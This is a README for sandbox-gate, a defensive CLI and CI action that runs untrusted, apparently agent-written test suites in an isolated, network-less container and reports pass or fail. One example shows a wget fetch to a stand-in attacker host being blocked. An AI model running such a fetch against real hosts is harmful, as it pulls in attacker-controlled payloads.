# sandbox-gate

> Run an untrusted test suite inside a locked-down, ephemeral sandbox and exit
> **0 (pass)** or **1 (fail)** — a drop-in CI gate for **AI-generated code**.

When an agent writes code, you want to run its tests before you trust it — but
running unverified code on your machine or CI runner means giving it your
filesystem, your secrets, and outbound network. `sandbox-gate` runs that test
suite in a throwaway container with **no network, a read-only copy of the source,
an unprivileged user, and CPU/memory/PID limits**, then hands you a clean
pass/fail and a JSON result.

```
$ sandbox-gate run --dir ./agent-output
→ sandbox-gate: `go test ./...` in golang:1.26-alpine  (net=false, non-root=true, 1024MB, 2 cpu, backend=docker)
ok  	example/agent	0.4s
✓ sandbox-gate: pass  (exit 0 · 812ms · backend=docker · image=golang:1.26-alpine · net=off)
```

## Why

LLM agents now open PRs autonomously. The mechanical question before merge is
always the same: *do its tests pass — without letting the code touch anything it
shouldn't?* Piping agent output straight into `npm test` on your runner answers
the first half and ignores the second. `sandbox-gate` answers both, and is small
enough to drop into any pipeline.

## The isolation, concretely

These are daemon-enforced controls, not conventions:

| Guarantee | How | Opt out |
|---|---|---|
| **No network egress** | `--network=none` | `--net` |
| **Host checkout untouched** | source bind-mounted read-only at `/src`, copied into a tmpfs `/work` | — |
| **Unprivileged** | runs as uid 1000, host Docker socket never mounted | `--non-root=false` |
| **Bounded resources** | `--memory`, `--cpus`, `--pids-limit` | flags / config |
| **Bounded time** | wall-clock `--timeout`, force-killed (exit 124) | `--timeout` |
| **Ephemeral** | `--rm`; nothing survives the run | — |

Network is **off by default** — code generated by an agent gets no way to phone
home, exfiltrate, or fetch a payload unless you explicitly pass `--net`:

```
$ sandbox-gate run --dir ./agent-output --cmd "wget -qO- http://evil.example"
wget: bad address 'evil.example'         # blocked: --network=none
✗ sandbox-gate: fail  (exit 1 · net=off)
```

## Install

```sh
go install github.com/mykolapodpriatov/sandbox-gate/cmd/sandbox-gate@latest
```

Requires a Docker daemon on the host (Colima, Docker Desktop, or a CI runner's
preinstalled Docker all work).

## Use

```sh
# zero config — detects the stack (go / node / python / rust / ruby)
sandbox-gate run --dir ./project

# explicit
sandbox-gate run --image node:20-alpine --cmd "npm test" --out result.json

# opt back into network, tighter limits
sandbox-gate run --net --memory 512 --cpus 1 --timeout 2m
```

Exit codes: **0** pass · **1** fail · **124** timeout · **2** usage/config error.
`--out result.json` writes the machine-readable result:

```json
{ "status": "fail", "exit_code": 1, "duration_ms": 812, "backend": "docker",
  "image": "node:20-alpine", "isolation": { "network": false, "non_root": true } }
```

### Config (optional `.sandbox-gate.yml`)

```yaml
image: node:20-alpine
cmd: npm test
network: false
memory_mb: 1024
cpus: 2
timeout: 5m
```

Precedence: **flag → config → auto-detection → secure default.** Run
`sandbox-gate init` to print this template, or `sandbox-gate init --ci github`
for a workflow snippet.

## CI

GitHub Action:

```yaml
- uses: mykolapodpriatov/sandbox-gate@v1
  with:
    dir: .
```

The action fails the job exactly when the sandboxed suite fails — a required
status check that runs agent code in isolation.

## Backends

`sandbox-gate` is backend-agnostic: a run is a `sandbox.Backend` away from any
ephemeral runtime.

| Backend | Status | Needs |
|---|---|---|
| **docker** | ✅ supported, the default | a local/CI Docker daemon |
| e2b / daytona | interface-ready (next drivers) | a cloud sandbox account |

Adding a cloud backend is implementing one interface:

```go
type Backend interface {
    Name() string
    Run(ctx context.Context, spec Spec, out io.Writer) (Result, error)
}
```

## Architecture

```
cmd/sandbox-gate   flag parsing → gate
internal/gate      merge flags+config+detection → Spec, pick backend, map exit code   (pure, unit-tested)
internal/detect    go.mod / package.json / … → default image + test command
internal/config    .sandbox-gate.yml
internal/sandbox   Backend interface · Docker driver (isolation) · Fake (tests)
internal/report    JSON + human summary
```

## Development

```sh
./verify.sh   # vet + build + unit + Docker integration tests + smoke
```

The Docker integration tests (`internal/sandbox`) spin real containers and
self-skip when no daemon is present; CI runs the gate on its own
`examples/passing` and `examples/failing` fixtures (dogfooding).
